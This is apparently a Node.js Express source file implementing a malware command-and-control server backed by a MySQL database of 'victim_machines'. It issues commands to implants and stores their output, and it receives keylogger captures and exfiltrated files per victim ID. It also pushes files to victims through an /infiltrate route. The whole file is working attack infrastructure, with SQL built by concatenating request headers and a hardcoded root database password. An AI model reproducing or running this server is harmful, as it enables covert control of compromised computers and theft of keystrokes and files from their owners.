let express = require('express'); 
let cookieParser = require('cookie-parser'); 
let bodyParser = require('body-parser');
let fs = require('fs');

//setup express app 
let app = express() 

var mysql = require('mysql');

app.use(cookieParser()); 
app.use(bodyParser.urlencoded({ extended: true }));
app.use(function(req, res, next){
  if (req.is('text/*')) {
    req.text = '';
    req.setEncoding('utf8');
    req.on('data', function(chunk){ req.text += chunk });
    req.on('end', next);
  } else {
    next();
  }
});

var con = mysql.createConnection({
	host: "localhost",
	user: "root",
	password: "newpassword",
	database: "JOB_C2"
});

//basic route for homepage 
app.get('/', (req, res)=>{ 
res.send('welcome to express app'); 
}); 

//JSON object to be added to cookie 
let users = { 
name : "69", 
Age : "18"
} 

app.get('/infiltrate', (req, res)=>{
	console.log("Uploading file...");

	con.query("SELECT file_names FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
		if (err) throw err;

		console.log(result);
		var base64_output = result[0].file_names;
                let buff = new Buffer(base64_output, 'base64');
                let decoded_output = buff.toString('ascii');
                var json_output = JSON.parse(decoded_output);

		var file_name = json_output[req.headers.cookie];
		console.log("Infiltrate File: " + file_name);

		fs.readFile(file_name, function(err, data) {
			res.send(data);
		});
	});

	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
		if (err) throw err;
		console.log(result);
		var base64_output = result[0].command;
		let buff = new Buffer(base64_output, 'base64');
		let decoded_output = buff.toString('ascii');
		var json_output = JSON.parse(decoded_output);

		//console.log("Cookie: " + req.headers.cookie);
		//console.log("Command JSON: %j", json_output["exfiltrate"]);
		delete json_output["infiltrate"][req.headers.cookie];

		let buff2 = new Buffer(JSON.stringify(json_output));
		let b64_final = buff2.toString('base64');

		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
			if (err) throw err;
			console.log(result);
		});
	});

});
			

app.post('/keylogger', (req, res)=>{
	console.log("Getting keylog output...");
	
	fs.appendFile('./keylog/' + req.headers.id + '_keylog.txt', req.text, function (err) {
		if (err) return console.log(err);
	});
	
	console.log("Saved keylog to file!");
});

	
app.post('/exfiltrate', (req, res)=>{

	console.log("downloading file...");

	con.query("SELECT file_names FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
		if (err) throw err;

		console.log(result);
		var base64_output = result[0].file_names;
                let buff = new Buffer(base64_output, 'base64');
                let decoded_output = buff.toString('ascii');
                var json_output = JSON.parse(decoded_output);

		var file_name = './uploads/' + json_output[req.headers.cookie];
		console.log("File name: " + file_name);

		console.log(req.text);
		fs.writeFile(file_name, req.text, function (err) {
			if (err) return console.log(err);
		});
	});

	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
		if (err) throw err;
		console.log(result);
		var base64_output = result[0].command;
		let buff = new Buffer(base64_output, 'base64');
		let decoded_output = buff.toString('ascii');
		var json_output = JSON.parse(decoded_output);

		console.log("Cookie: " + req.headers.cookie);
		console.log("Command JSON: %j", json_output["exfiltrate"]);
		delete json_output["exfiltrate"][req.headers.cookie];

		let buff2 = new Buffer(JSON.stringify(json_output));
		let b64_final = buff2.toString('base64');

		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
			if (err) throw err;
			console.log(result);
		});

		res.send("test download file");
	});

});

//Route for adding cookie 
app.get('/sendCommandOutput', (req, res)=>{ 
//res.cookie("userData", users); 
//res.send('user data added to cookie'); 
	let b64_output = req.headers.cookie;
	let buff = new Buffer(b64_output, 'base64');
	let new_output = buff.toString('ascii');
	let new_json = JSON.parse(new_output);
	con.query("SELECT command_output FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function(err, result, fields) {
		if (err) throw err;
		console.log(result);
		var base64_output = result[0].command_output;
		console.log("Base64 Encoded command output:");
		console.log(base64_output);
		console.log("Decoded:");
		let buff = new Buffer(base64_output, 'base64');
		let decoded_output = buff.toString('ascii');
		console.log(decoded_output);
		var json_output = JSON.parse(decoded_output);
		//console.log(json_output["1"]);
		console.log("before json: %j", json_output);
		console.log("new json: %j", new_json);

		json_output["commands"] = { ...json_output["commands"], ...new_json };

		console.log("after json: %j", json_output);

		let buff2 = new Buffer(JSON.stringify(json_output));
		let b64_final = buff2.toString('base64');

		con.query("UPDATE victim_machines SET command_output = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
			if (err) throw err;
			console.log(result);
		});

	});

	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function(err, result, fields) {
		if (err) throw err;
		console.log(result);
		var base64_output = result[0].command;
		let buff = new Buffer(base64_output, 'base64');
		let decoded_commands = buff.toString('ascii');
		var json_commands = JSON.parse(decoded_commands);
		for (var k in new_json) {
			delete json_commands["commands"][k];
		}

		let buff2 = new Buffer(JSON.stringify(json_commands));
		let b64_final = buff2.toString('base64');

		//if (!Object.keys(json_commands).length) {
		//	b64_final = "";
		//}

		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
			if (err) throw err;
			console.log(result);
		});
	});

		
	res.send("test setuser");


	//for updating command_output
	//UPDATE victim_machines SET command_output = "eyIxIjogImNvbW1hbmQgbm90IGZvdW5kIiwgIjIiOiAidGVzdC50eHQiLCAiMyI6ICJyb290In0=" WHERE victim_id = "69";
}); 

//Iterate users data from cookie 
app.get('/getCommands', (req, res)=>{ 
	//console.log(req);
	//console.log("Cookies:");
	//console.log(req.headers.cookie);
	//console.log("Done with cookies");
	//shows all the cookies 
	//res.send(req.cookies); 
	
	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function(err, result, fields) {
		if (err) throw err;
		console.log(result);
		res.send(result[0].command);
	});
}); 

//Route for destroying cookie 
app.get('/logout', (req, res)=>{ 
//it will clear the userData cookie 
res.clearCookie('userData'); 
res.send('user logout successfully'); 
}); 


//server listens to port 3000 
app.listen(3000, '0.0.0.0', (err)=>{ 
if(err) 
throw err; 
console.log('listening on port 3000'); 
}); 
